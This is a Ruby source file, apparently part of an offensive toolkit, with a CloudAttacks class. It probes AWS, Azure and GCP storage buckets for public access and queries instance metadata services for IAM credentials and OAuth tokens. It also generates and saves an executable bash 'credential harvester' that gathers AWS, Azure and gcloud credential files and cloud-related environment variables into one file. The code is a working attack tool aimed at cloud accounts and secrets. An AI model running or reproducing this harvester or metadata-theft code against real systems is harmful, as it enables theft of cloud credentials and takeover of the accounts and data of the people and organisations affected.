require 'net/http'
require 'uri'
require 'json'
require_relative '../utils/network'
require_relative '../utils/colorize'

class CloudAttacks
  def self.test_aws_s3_bucket(bucket_name)
    begin
      uri = URI("http://#{bucket_name}.s3.amazonaws.com/")
      response = Network.http_request(uri.to_s)
      
      if response && response.code.to_i == 200
        puts Colorize.red("S3 bucket is public: #{bucket_name}")
        return { public: true, accessible: true }
      elsif response && response.code.to_i == 403
        puts Colorize.yellow("S3 bucket exists but is private: #{bucket_name}")
        return { public: false, exists: true }
      end
    rescue => e
    end
    
    { public: false, exists: false }
  end

  def self.test_azure_blob_storage(account_name, container_name)
    begin
      uri = URI("https://#{account_name}.blob.core.windows.net/#{container_name}")
      response = Network.http_request(uri.to_s)
      
      if response && response.code.to_i == 200
        puts Colorize.red("Azure blob container is public")
        return { public: true, accessible: true }
      end
    rescue => e
    end
    
    { public: false }
  end

  def self.test_gcp_bucket(bucket_name)
    begin
      uri = URI("https://storage.googleapis.com/#{bucket_name}")
      response = Network.http_request(uri.to_s)
      
      if response && response.code.to_i == 200
        puts Colorize.red("GCP bucket is public: #{bucket_name}")
        return { public: true, accessible: true }
      end
    rescue => e
    end
    
    { public: false }
  end

  def self.test_aws_metadata_service
    metadata_endpoints = [
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/user-data/',
      'http://169.254.169.254/latest/dynamic/instance-identity/document',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
    ]
    
    results = []
    
    metadata_endpoints.each do |endpoint|
      begin
        response = Network.http_request(endpoint)
        
        if response && response.code.to_i == 200 && response.body.length > 0
          puts Colorize.red("AWS metadata accessible: #{endpoint}")
          results << { endpoint: endpoint, accessible: true, data: response.body[0..200] }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_azure_metadata_service
    metadata_endpoints = [
      'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
      'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01'
    ]
    
    results = []
    
    metadata_endpoints.each do |endpoint|
      begin
        uri = URI(endpoint)
        http = Net::HTTP.new(uri.host, uri.port)
        req = Net::HTTP::Get.new(uri.path + '?' + uri.query)
        req['Metadata'] = 'true'
        
        res = http.request(req)
        
        if res.code.to_i == 200
          puts Colorize.red("Azure metadata accessible: #{endpoint}")
          results << { endpoint: endpoint, accessible: true, data: res.body[0..200] }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_gcp_metadata_service
    metadata_endpoints = [
      'http://metadata.google.internal/computeMetadata/v1/instance/',
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/'
    ]
    
    results = []
    
    metadata_endpoints.each do |endpoint|
      begin
        uri = URI(endpoint)
        http = Net::HTTP.new(uri.host, uri.port)
        req = Net::HTTP::Get.new(uri.path)
        req['Metadata-Flavor'] = 'Google'
        
        res = http.request(req)
        
        if res.code.to_i == 200
          puts Colorize.red("GCP metadata accessible: #{endpoint}")
          results << { endpoint: endpoint, accessible: true, data: res.body[0..200] }
        end
      rescue => e
      end
    end
    
    results
  end

  def self.generate_cloud_credential_harvester
    harvester = <<~SH
      #!/bin/bash
      
      echo "=== AWS Credentials ===" > cloud_creds.txt
      cat ~/.aws/credentials >> cloud_creds.txt 2>/dev/null
      cat ~/.aws/config >> cloud_creds.txt 2>/dev/null
      
      echo "" >> cloud_creds.txt
      echo "=== Azure Credentials ===" >> cloud_creds.txt
      cat ~/.azure/azureProfile.json >> cloud_creds.txt 2>/dev/null
      
      echo "" >> cloud_creds.txt
      echo "=== GCP Credentials ===" >> cloud_creds.txt
      cat ~/.config/gcloud/credentials.json >> cloud_creds.txt 2>/dev/null
      
      echo "" >> cloud_creds.txt
      echo "=== Environment Variables ===" >> cloud_creds.txt
      env | grep -i "aws\|azure\|gcp\|cloud" >> cloud_creds.txt
      
      cat cloud_creds.txt
    SH
    
    filename = "cloud_harvester_#{Time.now.to_i}.sh"
    File.write(filename, harvester)
    File.chmod(filename, 0755)
    puts Colorize.green("Cloud credential harvester saved: #{filename}")
    filename
  end
end

